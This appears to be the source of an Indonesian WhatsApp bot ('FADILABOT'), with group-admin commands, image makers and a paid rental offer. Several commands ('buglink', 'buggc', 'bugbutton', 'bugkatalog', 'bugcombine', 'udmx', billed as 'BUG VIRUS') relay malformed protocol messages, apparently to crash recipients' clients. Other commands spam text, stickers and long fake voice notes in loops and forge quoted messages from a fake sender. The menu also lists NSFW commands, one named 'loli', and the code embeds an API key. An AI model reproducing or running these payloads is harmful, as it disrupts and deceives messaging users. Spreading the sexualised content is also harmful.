//PEMBUAT SC INI ADALAH FADILA YANG TENTUNYA
//SELALU DI EJEK DAN DITUDUH SC DARI YT 😥
//TQ
//FADILA) →Pembuat Sc Ini lah🔥
//AKIRA |COMOT CASE MAKER
//YOGIPW |AMBIL FAKE
//YUZZU KAMIYAKA |AMBIL VIRTEX🛐
const {
...
module.exports = client = async (client, mek) => {
 ...
 if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas SHare link yakan🤔");
        reply("ANTILINK TERDETEKSI!! NGOMONG² BUTA YA 🗿? GABISA BACA PERATURAN!! SIAP KICK👋");
    ...
    if (new Date() * 1 - settingstatus > 1000) {
      ...
      await client.setStatus(`Bot Aktif selama ${uptime}`).catch((_) => _);
    ...
    switch (command) {
      ...
      case "help":
      case "?":
      client.sendMessage(from, "*MENAMPILKAN MENU...*", text, {
          quoted: fgif, });
        satu = fs.readFileSync('./30detik/sound1.mp3');
client.sendMessage(from, satu, MessageType.audio, {quoted: fvn, mimetype: 'audio/mp4', ptt:true})
...
║   ║║║║╩╣╚╣═╣║║║║║╩╣
║   ╚══╩═╩═╩═╩═╩╩╩╩═╝
  *INI ADALAH MENU FADILABOTZ*
 
❋ ❋ཻུ۪۪⸙MENU FADILABOT❋ཻུ۪۪⸙ ❋
♡───────────────────♡
🕐 Jam : ${jam}      
🌏 Hari : ${week} ${weton}
📆 Tanggal : ${date}
    ${readmore}
💻 PEMILIK BOT : wa.me/6283847854046
👤 NAMA OWNER : ×FADILA×
×××××××××××××××××××××××××××××
...
┣┬───────────┈ ⳹ 
┣ *CREATED BUGMENU*
┣  _DIBUAT OLEH FADILA_
┣┬───────────┈ ⳹ 
┣    *MAKER MENU*
┣ ${prefix}freefire (nama)
┣ ${prefix}wetglass
┣ ${prefix}multicolor3d
┣ ${prefix}watercolor
┣ ${prefix}luxurygold
...
┣  *NOTE : FITUR MAKER DIBUAT OLEH FADILA*
┣┬───────────┈ ⳹ 
┣ *SERTI MENU*
┣ ${prefix}fftourserti
...
┣ ${prefix}hentai
┣ ${prefix}loli
└─MOHON MAAF MASIH TERSEDIA 2 FITUR PADA MENU BOKEP
...
└┬───────────┈ ⳹ ❋ཻུ۪۪⸙ 
❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
*NOTEE : FITUR DIKIT? SABAR FADILA LAGI UPDATE*
...
*MAU SEWA BOT? KETIK .owner TRUS CHAT AJA... HARGA? 20K VIP+PERMANEN PAY💸 : GOPAY,QRIS,PULSA+5K*
║▌│█║▌│ █║▌│█│║▌║
║▌│█║▌│ █║▌│█│║▌║
`;
        sendButImage(from, menu, "BY FADILA GANTENG🐣", thumb, [
          {
            buttonId: `${prefix}antilink`,
            buttonText: {
              displayText: `ANTILINK 🔥`,
            },
            type: 1,
          },
          {
    ...
    break;
		...
		if (!isGroupAdmins) return reply(ind.admin())
		 ...
		 break;
          case 'buglink':
                if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
                 let warr = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         ...
         "ephemeralExpiration": 0
            ...
            client.relayWAMessage(warr, {waitForAck: true})(from, 0)
            ...
            "externalAdReply": {
                ...
                "thumbnail": fs.readFileSync(`./thumb.jpeg`),
                "sourceUrl": "https://youtube.com/c/FADILA BOTZ"}}})
             break;
			case "buggc":
let po = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
     ...
     break;
           case 'bugbutton':
        if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
        let fadilah = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         ...
         "ephemeralExpiration": 0
            ...
            client.relayWAMessage(fadilah, {waitForAck: true})(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'YUZZUKAMIYAKA🌹'},type:1}])
        let fadil = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         ...
         "ephemeralExpiration": 0
            ...
            client.relayWAMessage(fadil, {waitForAck: true})(from, 0)
   break;
         case 'bugkatalog':
if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
let beo = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         ...
         "ephemeralExpiration": 0
            ...
            client.relayWAMessage(beo, {waitForAck: true})(from, 0)
 babi = (teks) => {
...
let ps = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         ...
         "ephemeralExpiration": 0
            ...
            client.relayWAMessage(ps, {waitForAck: true})
}
client.sendMessage(from, "*YAUDAH OKEY🔥👹😗*", text, {
          quoted: fdoc, });
	break;
          case 'udmx': 
				if (!isGroup) return reply(mess.only.group)
client.sendMessage(mek.key.remoteJid, '👾BUG VIRUS BY FADILA👾', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
...
if (args.length < 1) return reply('Jumlahnya?')
 ...
 case 'bugcombine':
if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
                 let asu = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         },
         ...
         "ephemeralExpiration": 0
            ...
            client.relayWAMessage(asu, {waitForAck: true})
client.sendMessage(from, `FADILABOTZ`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    ...
    surface: 1,
    message: `HALO`,
    orderTitle: `FADILA`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
...
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  client.sendMessage(from, `${oi1}`, MessageType.text)
	  }
...
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	...
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  client.sendMessage(from, anu, sticker)
	  }
	...
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  client.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
...
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  client.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
 break;
	                 case 'pepek':
				    if (isGroup) return reply("GROUP ONLY ANJING")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=d6578f1c3279faa34fd4ca4e`)
                    buffer = await getBuffer(get_result.result)
                    client.sendMessage(from, buffer, video, { quoted: freply, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break
	  case 'spam':
			...
			case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					...
					client.sendMessage(from, yeh, text, { quoted: fgclink })
					break;
			case  'hentai': 
if (!isGroup) return reply(mess.only.group)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
client.sendMessage(from, buffer, image, { quoted: ftroli, thumbnail: fs.readFileSync('./stik/fake.jpeg')})
  break;
    case 'neon': 
					...
					client.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./stik/fake.jpeg')})
					break
       case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
					makell = args.join(" ")
					reply("TUNGGU... KALAU LAMA BERARTI GABISA")
			...
			break
				...
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": "*TSUNDERE*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/fake.jpeg')} } }, caption: 'Kek Hasilnya Kak...'})
				break
				case 'fftourserti':
				if (isGroup) return reply(mess.only.group)
				...
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": "*TSUNDERE*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/fake.jpeg')} } }, caption: 'Gini Hasilnya Kak...'})
				break
				case 'fftourserti2':
				if (isGroup) return reply(mess.only.group)
		 ...
		 client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": "*TSUNDERE*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/fake.jpeg')} } }, caption: 'Nih Hasilnya Kak+..'})
			break
                ...
                case 'freefire':
                    ...
                    bejuh = args.join(" ")
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=d6578f1c3279faa34fd4ca4e&text=${bejuh}`)
                    client.sendMessage(from, buffer, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": "*TSUNDERE*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/fake.jpeg')} } }, caption: 'Nih Hasilnya Kak√'})
    break
      case "owner":
        sendKontak(from, owner, "Fadila", "OWNER FADILABOT");
        client.sendMessage(from, "Tuh Nomor Owner Gw 😏", text, {
          quoted: fvideo, });
        break;
        case "bc": 
					if (!!mek.key.fromMe) return reply("ALAH KONTOL") 
					...
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						...
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `*「 FADILA BROADCAST 」*\n\n${body.slice(4)}`})
						}
						client.sendMessage(from, "*BROADCAST FADILABOT.*", text, {quoted: ftokoo, });
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 FADILABOT BROADCAST 」*\n\n${body.slice(4)}`)
						}
						client.sendMessage('*SUKSES*'), text, {quoted: ftokoo, };
					}
					break;
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      ...
      //------------------< Fitur Anti antian >-------------------
      case "antilink":
        if (!isGroup) return client.sendMessage(from, "*KHUSUS DI GRUP KAK...*", text, {
          quoted: fvideo, });
        if (!isGroupAdmins && !mek.key.fromMe) return client.sendMessage(from, "*KHUSUS ADMIN YAAA😗🔥*", text, {
          quoted: fgclink, });
        if (args[0] == "on") {
          if (isAntilink) return client.sendMessage(from, "*BERHASIL MENGAKTIFKAN ANTILINK KAK*", text, {
          quoted: fvn, });
          antilink.push(from);
          fs.writeFileSync(
          ...
          client.sendMessage(from, "*SUKSES MENGAKTIFKAN ANTILINK🔥*", text, {
          quoted: fgclink, });
        } else if (args[0] == "off") {
          ...
          client.sendMessage(from, "*SUKSES MEMATIKAN ANTILINK😗*", text, {
          quoted: fgclink, });
        } else if (!q) {
...
`.trim();
     ...
     case "demote":
      ...
      case 'promote':
					...
					break	
      case "closegc":
        if (!mek.key.fromMe && !isGroupAdmins) return client.sendMessage(from, "*KHUSUS ADMIN YAH.*", text, {
          quoted: fakegroup, });
        if (!isBotGroupAdmins) return client.sendMessage(from, "*BOT BUKAN ADMIN KAK...*", text, {
          quoted: fgclink, });
        if (!isGroup) return;
        client.sendMessage(from, "SUKSES CLOSE GRUP", text, {
          quoted: fvideo, });
        client.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
      case "revoke":
      ...
      case "opengc":
        ...
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        client.sendMessage(from, "*SUKSES MEMBUKA GRUP!!!*", text, {
          quoted: fvn, });
...
*Model* : ${i.phone.device_model}\n\n`;
      ...
      case "mode":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE BOT`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `PRIVATE MODE`,
            },
            type: 1,
          },
          {
...
if (args.length < 1) return reply('Teksnya?')
      ...
      case "public":
        ...
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        client.sendMessage(from, "「 *BOT SUKSES BERALIH KE MODE PUBLIC*  」", text, {
          quoted: floc, });
        break;
      case "self":
        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
        ...
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        fakestatus(`「 *BOT SUKSES BERALIH KE PRIVATE MODE*  」`);
        break;
      case "hidetag":
        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
        if (!isGroup) return reply(mess.only.group);
